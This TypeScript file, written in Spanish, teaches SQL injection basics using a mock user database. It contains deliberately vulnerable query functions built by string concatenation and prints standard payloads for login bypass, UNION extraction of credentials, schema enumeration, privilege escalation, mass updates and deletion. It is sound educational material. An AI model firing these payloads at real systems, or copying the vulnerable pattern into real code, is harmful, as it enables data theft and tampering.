/**
 * SQL Injection - Conceptos Básicos
 *
 * Conceptos clave:
 * - SQLi permite ejecutar consultas SQL arbitrarias
 * - Explota validación insuficiente de entrada
 * - Puede comprometer toda la base de datos
 * - Uno de los ataques más críticos (OWASP Top 10 #1)
 *
 * Tipos:
 * - In-band SQLi (Classic, Error-based, Union-based)
 * - Inferential SQLi (Blind Boolean, Time-based)
 * - Out-of-band SQLi
 *
 * Impacto:
 * - Lectura de datos sensibles
 * - Modificación/eliminación de datos
 * - Bypass de autenticación
 * - Ejecución de comandos del sistema (en casos extremos)
 */

// ============================================================================
// Simulación de Base de Datos
// ============================================================================

interface User {
    id: number;
    username: string;
    password: string;
    email: string;
    role: string;
}

interface Product {
    id: number;
    name: string;
    price: number;
    description: string;
}

// Base de datos simulada
const users: User[] = [
    {
        id: 1,
        username: 'admin',
        password: 'admin123',
        email: 'admin@example.com',
        role: 'admin',
    },
    {
        id: 2,
        username: 'alice',
        password: 'alice123',
        email: 'alice@example.com',
        role: 'user',
    },
    {
        id: 3,
        username: 'bob',
        password: 'bob123',
        email: 'bob@example.com',
        role: 'user',
    },
];

const products: Product[] = [
    { id: 1, name: 'Laptop', price: 999, description: 'High-end laptop' },
    { id: 2, name: 'Mouse', price: 25, description: 'Wireless mouse' },
    { id: 3, name: 'Keyboard', price: 75, description: 'Mechanical keyboard' },
];

// ============================================================================
// ❌ VULNERABLE: Consultas con concatenación de strings
// ============================================================================

/**
 * VULNERABLE: Login con SQLi
 *
 * Problema: Concatenación directa de input del usuario en query SQL
 */
export function vulnerableLogin(
    username: string,
    password: string
): User | null {
    // ❌ NO HACER: Construir query con concatenación
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

    console.log(`Query ejecutada: ${query}`);

    // Simular ejecución de query
    // En realidad, esto ejecutaría la query concatenada
    const user = users.find(
        u => u.username === username && u.password === password
    );

    return user || null;
}

/**
 * VULNERABLE: Búsqueda de productos
 */
export function vulnerableSearchProducts(searchTerm: string): Product[] {
    // ❌ NO HACER: Concatenación en query de búsqueda
    const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`;

    console.log(`Query ejecutada: ${query}`);

    // Simulación
    return products.filter(p =>
        p.name.toLowerCase().includes(searchTerm.toLowerCase())
    );
}

/**
 * VULNERABLE: Obtener usuario por ID
 */
export function vulnerableGetUserById(userId: string): User | null {
    // ❌ NO HACER: Sin validación de tipo
    const query = `SELECT * FROM users WHERE id = ${userId}`;

    console.log(`Query ejecutada: ${query}`);

    const id = parseInt(userId, 10);
    return users.find(u => u.id === id) || null;
}

/**
 * VULNERABLE: Actualizar email
 */
export function vulnerableUpdateEmail(
    userId: number,
    newEmail: string
): boolean {
    // ❌ NO HACER: Concatenación en UPDATE
    const query = `UPDATE users SET email = '${newEmail}' WHERE id = ${userId}`;

    console.log(`Query ejecutada: ${query}`);

    const user = users.find(u => u.id === userId);
    if (user) {
        user.email = newEmail;
        return true;
    }

    return false;
}

// ============================================================================
// Demonstración de Ataques SQLi
// ============================================================================

/**
 * Ataque: Bypass de autenticación
 */
export function demonstrateSQLiAuthBypass(): void {
    console.log('\n=== Ataque: Bypass de Autenticación ===\n');

    // Intento legítimo
    console.log('1. Login legítimo:');
    console.log("   Username: admin, Password: admin123");
    const legitUser = vulnerableLogin('admin', 'admin123');
    console.log(`   Resultado: ${legitUser ? '✅ Autenticado' : '❌ Fallido'}\n`);

    // Ataque SQLi
    console.log('2. Ataque SQLi - Bypass de autenticación:');
    const maliciousUsername = "admin' --";
    const anyPassword = 'wrongpassword';

    console.log(`   Username: ${maliciousUsername}`);
    console.log(`   Password: ${anyPassword}`);

    // Query resultante:
    // SELECT * FROM users WHERE username = 'admin' --' AND password = 'wrongpassword'
    // El -- comenta el resto, ignorando la validación de password

    console.log('\n   Query construida:');
    const query = `SELECT * FROM users WHERE username = '${maliciousUsername}' AND password = '${anyPassword}'`;
    console.log(`   ${query}`);

    console.log('\n   ⚠️  El comentario -- ignora la validación de contraseña!');
    console.log("   ⚠️  Query efectiva: SELECT * FROM users WHERE username = 'admin'");

    // Otros payloads comunes
    console.log('\n3. Otros payloads de bypass:');
    const bypassPayloads = [
        "admin' OR '1'='1",
        "admin' OR 1=1--",
        "' OR '1'='1' --",
        "admin'/*",
        "' OR 'x'='x",
    ];

    bypassPayloads.forEach(payload => {
        console.log(`   - ${payload}`);
    });
}

/**
 * Ataque: UNION-based SQLi
 */
export function demonstrateUnionBasedSQLi(): void {
    console.log('\n=== Ataque: UNION-based SQLi ===\n');

    console.log('1. Búsqueda normal:');
    const normalSearch = 'Laptop';
    console.log(`   Término: ${normalSearch}`);
    vulnerableSearchProducts(normalSearch);

    console.log('\n2. Ataque UNION para extraer datos:');
    const unionPayload = "Laptop' UNION SELECT id, username, password, email FROM users--";

    console.log(`   Payload: ${unionPayload}`);

    // Query resultante:
    // SELECT * FROM products WHERE name LIKE '%Laptop' UNION SELECT id, username, password, email FROM users--%'

    console.log('\n   Query construida:');
    const query = `SELECT * FROM products WHERE name LIKE '%${unionPayload}%'`;
    console.log(`   ${query}`);

    console.log('\n   ⚠️  El atacante puede leer la tabla de usuarios!');
    console.log('   ⚠️  Resultado incluiría: id, username, password, email de todos los usuarios');
}

/**
 * Ataque: Determinar número de columnas
 */
export function demonstrateColumnEnumeration(): void {
    console.log('\n=== Técnica: Determinar número de columnas ===\n');

    console.log('Paso 1: Probar diferentes números de columnas con ORDER BY:');

    const orderByPayloads = [
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' ORDER BY 4--",
        "' ORDER BY 5--",  // Fallará si hay menos de 5 columnas
    ];

    orderByPayloads.forEach(payload => {
        console.log(`   ${payload}`);
    });

    console.log('\nPaso 2: Usar UNION SELECT con NULL:');
    console.log("   ' UNION SELECT NULL--");
    console.log("   ' UNION SELECT NULL, NULL--");
    console.log("   ' UNION SELECT NULL, NULL, NULL--");

    console.log('\nPaso 3: Una vez conocido el número, determinar tipos:');
    console.log("   ' UNION SELECT 'a', NULL, NULL--");
    console.log("   ' UNION SELECT NULL, 'a', NULL--");
    console.log("   ' UNION SELECT NULL, NULL, 'a'--");
}

/**
 * Ataque: Extracción de esquema de base de datos
 */
export function demonstrateSchemaExtraction(): void {
    console.log('\n=== Ataque: Extracción de Esquema ===\n');

    console.log('1. Obtener nombres de tablas (MySQL):');
    const tablePayload = "' UNION SELECT table_name, NULL FROM information_schema.tables--";
    console.log(`   ${tablePayload}\n`);

    console.log('2. Obtener nombres de columnas (MySQL):');
    const columnPayload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--";
    console.log(`   ${columnPayload}\n`);

    console.log('3. Versión de base de datos:');
    console.log('   MySQL: SELECT @@version');
    console.log('   PostgreSQL: SELECT version()');
    console.log('   SQL Server: SELECT @@version');
    console.log('   Oracle: SELECT banner FROM v$version\n');

    console.log('4. Usuario actual:');
    console.log('   MySQL: SELECT user()');
    console.log('   PostgreSQL: SELECT current_user');
    console.log('   SQL Server: SELECT SYSTEM_USER');
}

/**
 * Ataque: Modificación de datos
 */
export function demonstrateDataManipulation(): void {
    console.log('\n=== Ataque: Modificación de Datos ===\n');

    console.log('1. Payload para actualizar múltiples registros:');
    const updateAllPayload = "test@example.com' WHERE 1=1--";
    console.log(`   Email: ${updateAllPayload}`);

    // Query resultante:
    // UPDATE users SET email = 'test@example.com' WHERE 1=1--' WHERE id = 1

    console.log('\n   Query construida:');
    const query = `UPDATE users SET email = '${updateAllPayload}' WHERE id = 1`;
    console.log(`   ${query}`);

    console.log('\n   ⚠️  Actualizaría el email de TODOS los usuarios!');

    console.log('\n2. Payload para escalación de privilegios:');
    const privEscPayload = "evil@example.com', role='admin' WHERE username='alice'--";
    console.log(`   Email: ${privEscPayload}`);

    console.log('\n   ⚠️  Podría cambiar el rol de un usuario a admin!');

    console.log('\n3. Payload para eliminación de datos:');
    const deletePayload = "'; DELETE FROM users WHERE '1'='1";
    console.log(`   ${deletePayload}`);
    console.log('\n   ⚠️  Podría eliminar todos los usuarios!');
}

/**
 * Identificación de bases de datos
 */
export function demonstrateDatabaseFingerprinting(): void {
    console.log('\n=== Fingerprinting de Base de Datos ===\n');

    console.log('Diferencias en concatenación de strings:\n');
    console.log('   MySQL:    CONCAT("a", "b") o "a" "b"');
    console.log('   PostgreSQL: "a" || "b"');
    console.log('   SQL Server: "a" + "b"');
    console.log('   Oracle:   "a" || "b"\n');

    console.log('Comentarios:\n');
    console.log('   MySQL:    -- o #');
    console.log('   PostgreSQL: --');
    console.log('   SQL Server: -- o /* */');
    console.log('   Oracle:   --\n');

    console.log('Funciones de tiempo (para Blind SQLi):\n');
    console.log('   MySQL:    SLEEP(5)');
    console.log('   PostgreSQL: pg_sleep(5)');
    console.log('   SQL Server: WAITFOR DELAY "00:00:05"');
    console.log('   Oracle:   DBMS_LOCK.SLEEP(5)');
}

/**
 * Comparación vulnerable vs seguro
 */
export function printSQLiComparison(): void {
    console.log('\n=== SQL Injection: Vulnerable vs Seguro ===\n');

    console.log('❌ VULNERABLE:');
    console.log('   - Concatenación de strings para queries');
    console.log('   - Sin validación de entrada');
    console.log('   - Sin prepared statements');
    console.log('   - Sin escapado de caracteres especiales');
    console.log('   - Mensajes de error detallados expuestos');

    console.log('\n⚠️  IMPACTO:');
    console.log('   - Bypass de autenticación');
    console.log('   - Lectura de datos sensibles');
    console.log('   - Modificación/eliminación de datos');
    console.log('   - Escalación de privilegios');
    console.log('   - En casos extremos: ejecución de comandos del sistema');

    console.log('\n🎯 PAYLOADS COMUNES:');
    console.log('   Authentication bypass:');
    console.log('     - admin\' --');
    console.log('     - \' OR \'1\'=\'1');
    console.log('   Data extraction:');
    console.log('     - \' UNION SELECT username, password FROM users--');
    console.log('   Boolean blind:');
    console.log('     - \' AND \'1\'=\'1');
    console.log('     - \' AND \'1\'=\'2');
}

// ============================================================================
// Ejecución
// ============================================================================

if (require.main === module) {
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║       SQL INJECTION - Conceptos Básicos               ║');
    console.log('╚════════════════════════════════════════════════════════╝');

    demonstrateSQLiAuthBypass();
    demonstrateUnionBasedSQLi();
    demonstrateColumnEnumeration();
    demonstrateSchemaExtraction();
    demonstrateDataManipulation();
    demonstrateDatabaseFingerprinting();
    printSQLiComparison();

    console.log('\n✅ Demostración completada\n');
    console.log('👉 Ver 09-sqli-prevention.ts para soluciones seguras\n');
}
